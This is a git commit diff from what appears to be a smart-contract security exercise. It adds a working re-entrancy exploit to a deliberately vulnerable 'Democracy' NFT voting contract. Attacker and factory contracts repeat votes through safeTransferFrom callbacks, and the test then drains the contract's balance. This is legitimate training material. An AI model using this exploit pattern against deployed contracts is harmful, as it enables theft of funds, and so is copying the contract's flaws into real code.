35a444c36a666ee7b0ada1da978967bc2bebc8be
tommyrharper <thomasrobertharper@gmail.com>
2023-08-19 21:49:04 +0100

    feat: Democracy.sol complete

--- contracts/Democracy.sol
+++ contracts/Democracy.sol
@@ -4,6 +4,9 @@ pragma solidity 0.8.15;
 
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+import "hardhat/console.sol";
 
 /**
  * Democracy NFT: One hodler, one vote!
@@ -35,18 +38,12 @@ contract Democracy is Ownable, ERC721 {
     }
 
     modifier contractBalanceIsGreaterThanZero() {
-        require(
-            address(this).balance > 0,
-            "DemocracyNft: Insufficient contract balance"
-        );
+        require(address(this).balance > 0, "DemocracyNft: Insufficient contract balance");
         _;
     }
 
     modifier nomineeIsValid(address nominee) {
-        require(
-            nominee == incumbent || nominee == challenger,
-            "DemocracyNft: Must vote for incumbent or challenger"
-        );
+        require(nominee == incumbent || nominee == challenger, "DemocracyNft: Must vote for incumbent or challenger");
         _;
     }
 
@@ -56,10 +53,7 @@ contract Democracy is Ownable, ERC721 {
     }
 
     modifier callerIsNotAContract() {
-        require(
-            tx.origin == msg.sender,
-            "DemocracyNft: Feature available to EOAs only"
-        );
+        require(tx.origin == msg.sender, "DemocracyNft: Feature available to EOAs only");
         _;
     }
 
@@ -68,10 +62,7 @@ contract Democracy is Ownable, ERC721 {
     }
 
     function nominateChallenger(address challenger_) external {
-        require(
-            challenger == address(0),
-            "DemocracyNft: Challenger already nominated"
-        );
+        require(challenger == address(0), "DemocracyNft: Challenger already nominated");
 
         challenger = challenger_;
 
@@ -79,19 +70,12 @@ contract Democracy is Ownable, ERC721 {
         _rigElection();
     }
 
-    function vote(address nominee)
-        external
-        contractBalanceIsGreaterThanZero
-        electionNotYetCalled
-        nomineeIsValid(nominee)
-        hodlerNotYetVoted
-    {
+    function vote(
+        address nominee
+    ) external contractBalanceIsGreaterThanZero electionNotYetCalled nomineeIsValid(nominee) hodlerNotYetVoted {
         // Check NFT balance
         uint256 hodlerNftBalance = balanceOf(msg.sender);
-        require(
-            hodlerNftBalance > 0,
-            "DemocracyNft: Voting only for NFT hodlers"
-        );
+        require(hodlerNftBalance > 0, "DemocracyNft: Voting only for NFT hodlers");
 
         // Log votes
         votes[nominee] += hodlerNftBalance;
@@ -106,50 +90,24 @@ contract Democracy is Ownable, ERC721 {
         }
     }
 
-    function mint(address to, uint256 tokenId)
-        external
-        payable
-        callerIsNotAContract
-        onlyOwner
-    {
-        require(
-            msg.value >= PRICE,
-            "DemocracyNft: Insufficient transaction value"
-        );
+    function mint(address to, uint256 tokenId) external payable callerIsNotAContract onlyOwner {
+        require(msg.value >= PRICE, "DemocracyNft: Insufficient transaction value");
 
         _mint(to, tokenId);
     }
 
-    function approve(address to, uint256 tokenId)
-        public
-        override
-        callerIsNotAContract
-    {
+    function approve(address to, uint256 tokenId) public override callerIsNotAContract {
         _approve(to, tokenId);
     }
 
-    function transferFrom(
-        address from,
-        address to,
-        uint256 tokenId
-    ) public override callerIsNotAContract {
-        require(
-            _isApprovedOrOwner(_msgSender(), tokenId),
-            "ERC721: caller is not token owner or approved"
-        );
+    function transferFrom(address from, address to, uint256 tokenId) public override callerIsNotAContract {
+        require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: caller is not token owner or approved");
 
         _transfer(from, to, tokenId);
     }
 
-    function safeTransferFrom(
-        address from,
-        address to,
-        uint256 tokenId
-    ) public override callerIsNotAContract {
-        require(
-            _isApprovedOrOwner(_msgSender(), tokenId),
-            "ERC721: caller is not token owner or approved"
-        );
+    function safeTransferFrom(address from, address to, uint256 tokenId) public override callerIsNotAContract {
+        require(_isApprovedOrOwner(_msgSender(), tokenId), "ERC721: caller is not token owner or approved");
 
         _safeTransfer(from, to, tokenId, "");
     }
@@ -177,5 +135,50 @@ contract Democracy is Ownable, ERC721 {
         // Make it look like a close election...
         votes[incumbent] = 5;
         votes[challenger] = 3;
+    }
+}
+
+contract DemocracyAttackerFactory {
+    function createAttacker(Democracy target, address nominee) public returns (address) {
+        DemocracyAttacker attacker = new DemocracyAttacker(target, nominee, address(this));
+        return address(attacker);
+    }
+}
+
+contract DemocracyAttacker is IERC721Receiver {
+    Democracy target;
+    DemocracyAttackerFactory factory;
+    address nominee;
+
+    constructor(Democracy _target, address _nominee, address _factory) {
+        target = _target;
+        nominee = _nominee;
+        factory = DemocracyAttackerFactory(_factory);
+    }
+
+    function attack() public {
+        target.vote(nominee);
+    }
+
+    function createSubAttacker() public returns (address) {
+        return factory.createAttacker(target, nominee);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {
+        if (target.votes(nominee) < 6) {
+            address subAttacker = createSubAttacker();
+            bytes memory empty;
+            target.safeTransferFrom(address(this), subAttacker, 0, empty);
+            DemocracyAttacker(payable(subAttacker)).attack();
+        }
     }
 }
--- test/Democracy.js
+++ test/Democracy.js
@@ -1,7 +1,4 @@
-const {
-  time,
-  loadFixture,
-} = require("@nomicfoundation/hardhat-network-helpers");
+const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
 const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
@@ -9,29 +6,45 @@ const { ethers } = require("hardhat");
 const NAME = "Democracy";
 
 describe(NAME, function () {
-  async function setup() {
-      const [owner, attackerWallet] = await ethers.getSigners();
-      const value = ethers.utils.parseEther("1");
+    async function setup() {
+        const [owner, attackerWallet] = await ethers.getSigners();
+        const value = ethers.utils.parseEther("1");
 
-      const VictimFactory = await ethers.getContractFactory(NAME);
-      const victimContract = await VictimFactory.deploy({ value });
+        const VictimFactory = await ethers.getContractFactory(NAME);
+        const victimContract = await VictimFactory.deploy({ value });
 
-      return { victimContract, attackerWallet };
-  }
+        return { victimContract, attackerWallet };
+    }
 
-  describe("exploit", async function () {
-      let victimContract, attackerWallet;
-      before(async function () {
-          ({ victimContract, attackerWallet } = await loadFixture(setup));
-      })
+    describe("exploit", async function () {
+        let victimContract, attackerWallet;
+        before(async function () {
+            ({ victimContract, attackerWallet } = await loadFixture(setup));
+        });
 
-      it("conduct your attack here", async function () {
-          
-      });
+        it("conduct your attack here", async function () {
+            const AttackerFactoryFactory = await ethers.getContractFactory("DemocracyAttackerFactory");
+            const attackerFactoryContract = await AttackerFactoryFactory.deploy();
 
-      after(async function () {
-          const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
-          expect(victimContractBalance).to.be.equal('0');
-      });
-  });
+            const AttackerFactory = await ethers.getContractFactory("DemocracyAttacker");
+            const attackerContract = await AttackerFactory.deploy(
+                victimContract.address,
+                attackerWallet.address,
+                attackerFactoryContract.address
+            );
+
+            await victimContract.connect(attackerWallet).nominateChallenger(attackerWallet.address);
+            await victimContract
+                .connect(attackerWallet)
+                .transferFrom(attackerWallet.address, attackerContract.address, 0);
+
+            await attackerContract.attack();
+            await victimContract.connect(attackerWallet).withdrawToAddress(attackerWallet.address);
+        });
+
+        after(async function () {
+            const victimContractBalance = await ethers.provider.getBalance(victimContract.address);
+            expect(victimContractBalance).to.be.equal("0");
+        });
+    });
 });
